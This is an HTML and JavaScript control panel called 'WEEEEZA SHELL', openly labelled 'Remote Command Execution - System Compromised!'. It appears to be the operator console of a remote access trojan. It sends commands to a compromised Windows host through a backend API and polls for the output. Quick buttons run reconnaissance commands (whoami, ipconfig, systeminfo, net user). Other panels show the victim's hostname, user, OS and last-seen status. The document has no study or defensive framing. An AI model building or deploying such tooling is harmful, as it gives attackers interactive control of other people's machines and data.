<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🔥 WEEEEZA SHELL 🔥</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background: linear-gradient(135deg, #000 0%, #1a1a1a 100%);
            color: #00ff00;
            font-family: 'Courier New', monospace;
            min-height: 100vh;
            padding: 20px;
        }

        .header {
            text-align: center;
            margin-bottom: 30px;
            padding: 20px;
            background: linear-gradient(45deg, #ff0000, #ff4444);
            border-radius: 10px;
            box-shadow: 0 0 20px rgba(255, 0, 0, 0.5);
        }

        .header h1 {
            font-size: 2.5em;
            color: #ffffff;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.8);
            animation: pulse 2s infinite;
        }

        @keyframes pulse {
            0%, 100% { transform: scale(1); }
            50% { transform: scale(1.05); }
        }

        .status {
            padding: 15px;
            margin: 20px 0;
            border-radius: 5px;
            text-align: center;
            font-weight: bold;
            font-size: 1.2em;
        }

        .status.connected {
            background: rgba(0, 255, 0, 0.3);
            border: 1px solid #00ff00;
            color: #00ff00;
        }

        .status.disconnected {
            background: rgba(255, 0, 0, 0.3);
            border: 1px solid #ff0000;
            color: #ff0000;
        }

        .info-bar {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 15px;
            margin: 20px 0;
        }

        .info-item {
            background: rgba(0, 255, 0, 0.1);
            border: 1px solid #00ff00;
            padding: 10px;
            border-radius: 5px;
            text-align: center;
        }

        .quick-commands {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(120px, 1fr));
            gap: 10px;
            margin: 20px 0;
        }

        .quick-btn {
            background: linear-gradient(45deg, #ff4444, #ff0000);
            color: white;
            border: none;
            padding: 10px;
            border-radius: 5px;
            cursor: pointer;
            font-weight: bold;
            transition: all 0.3s ease;
        }

        .quick-btn:hover {
            background: linear-gradient(45deg, #ff6666, #ff2222);
            transform: translateY(-2px);
        }

        .command-area {
            display: flex;
            gap: 10px;
            margin: 20px 0;
        }

        .command-area input {
            flex: 1;
            padding: 15px;
            background: #1a1a1a;
            border: 1px solid #00ff00;
            color: #00ff00;
            border-radius: 5px;
            font-family: 'Courier New', monospace;
        }

        .command-area select {
            padding: 15px;
            background: #1a1a1a;
            border: 1px solid #00ff00;
            color: #00ff00;
            border-radius: 5px;
        }

        .execute-btn, .clear-btn {
            padding: 15px 20px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-weight: bold;
        }

        .execute-btn {
            background: linear-gradient(45deg, #ff0000, #ff4444);
            color: white;
        }

        .clear-btn {
            background: linear-gradient(45deg, #444444, #666666);
            color: white;
        }

        .output {
            background: #0a0a0a;
            border: 1px solid #00ff00;
            border-radius: 5px;
            height: 400px;
            overflow-y: auto;
            padding: 15px;
            font-family: 'Courier New', monospace;
            white-space: pre-wrap;
        }

        .output-line {
            margin: 5px 0;
            padding: 5px;
            border-left: 3px solid #00ff00;
            padding-left: 10px;
        }

        .output-line.error {
            border-left-color: #ff0000;
            color: #ff4444;
        }

        .output-line.system {
            border-left-color: #ffff00;
            color: #ffff00;
        }
    </style>
</head>
<body>
    <div class="header">
        <h1>🔥 WEEEEZA SHELL 🔥</h1>
        <p>Remote Command Execution - System Compromised!</p>
    </div>
    
    <div class="status" id="status">Disconnected</div>
    
    <div class="info-bar">
        <div class="info-item">
            <strong>Hostname:</strong> <span id="hostname">-</span>
        </div>
        <div class="info-item">
            <strong>User:</strong> <span id="user">-</span>
        </div>
        <div class="info-item">
            <strong>OS:</strong> <span id="os">-</span>
        </div>
        <div class="info-item">
            <strong>Last Seen:</strong> <span id="lastSeen">-</span>
        </div>
    </div>
    
    <div class="quick-commands">
        <button class="quick-btn" onclick="quickCmd('whoami')">whoami</button>
        <button class="quick-btn" onclick="quickCmd('hostname')">hostname</button>
        <button class="quick-btn" onclick="quickCmd('ipconfig')">ipconfig</button>
        <button class="quick-btn" onclick="quickCmd('dir C:\\\\')">dir C:\\</button>
        <button class="quick-btn" onclick="quickCmd('systeminfo')">systeminfo</button>
        <button class="quick-btn" onclick="quickCmd('net user')">net user</button>
    </div>
    
    <div class="command-area">
        <input type="text" id="cmdInput" placeholder="Enter command..." onkeypress="if(event.key=='Enter')sendCmd()">
        <select id="cmdType">
            <option value="auto">Auto</option>
            <option value="cmd">CMD</option>
            <option value="powershell">PowerShell</option>
        </select>
        <button class="execute-btn" onclick="sendCmd()">Execute</button>
        <button class="clear-btn" onclick="clearOutput()">Clear</button>
    </div>
    
    <div id="output" class="output">
        <div class="output-line system">🔥 WEEEEZA Shell Ready</div>
        <div class="output-line system">Waiting for connection...</div>
    </div>

    <script>
        let connected = false;
        
        function quickCmd(cmd) {
            document.getElementById('cmdInput').value = cmd;
            sendCmd();
        }
        
        async function sendCmd() {
            const input = document.getElementById('cmdInput');
            const type = document.getElementById('cmdType');
            const cmd = input.value.trim();
            if (!cmd) return;
            
            const id = 'cmd_' + Math.random().toString(36).substr(2, 9);
            
            try {
                await fetch('/api/send', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        id: id,
                        command: cmd,
                        type: type.value
                    })
                });
                
                input.value = '';
                addOutput('> ' + cmd);
                pollResponse(id);
            } catch (e) {
                addOutput('Error: ' + e.message);
            }
        }
        
        async function pollResponse(id) {
            for (let i = 0; i < 30; i++) {
                try {
                    const resp = await fetch('/api/response/' + id);
                    const data = await resp.json();
                    
                    if (data.id === id) {
                        if (data.output) addOutput(data.output);
                        if (data.error) addOutput('ERROR: ' + data.error);
                        updateInfo(data);
                        return;
                    }
                    
                    await new Promise(r => setTimeout(r, 1000));
                } catch (e) {
                    break;
                }
            }
            addOutput('Command timeout');
        }
        
        function addOutput(text) {
            const output = document.getElementById('output');
            const div = document.createElement('div');
            div.className = 'output-line';
            div.textContent = new Date().toLocaleTimeString() + ' ' + text;
            output.appendChild(div);
            output.scrollTop = output.scrollHeight;
        }
        
        function updateInfo(data) {
            if (data.hostname) document.getElementById('hostname').textContent = data.hostname;
            if (data.user) document.getElementById('user').textContent = data.user;
            if (data.os) document.getElementById('os').textContent = data.os;
        }
        
        function clearOutput() {
            document.getElementById('output').innerHTML = `
                <div class="output-line system">🔥 WEEEEZA Shell Ready</div>
                <div class="output-line system">Output cleared...</div>
            `;
        }
        
        async function checkStatus() {
            try {
                const resp = await fetch('/api/status');
                const data = await resp.json();
                const status = document.getElementById('status');
                
                if (data.connected) {
                    if (!connected) {
                        connected = true;
                        status.textContent = 'Connected ✅';
                        status.className = 'status connected';
                        addOutput('Shell connected!');
                    }
                } else {
                    if (connected) {
                        connected = false;
                        status.textContent = 'Disconnected ❌';
                        status.className = 'status disconnected';
                        addOutput('Shell disconnected!');
                    }
                }
                
                document.getElementById('lastSeen').textContent = data.last_seen || 'Never';
            } catch (e) {
                if (connected) {
                    connected = false;
                    document.getElementById('status').className = 'status disconnected';
                }
            }
        }
        
        setInterval(checkStatus, 3000);
        checkStatus();
    </script>
</body>
</html>
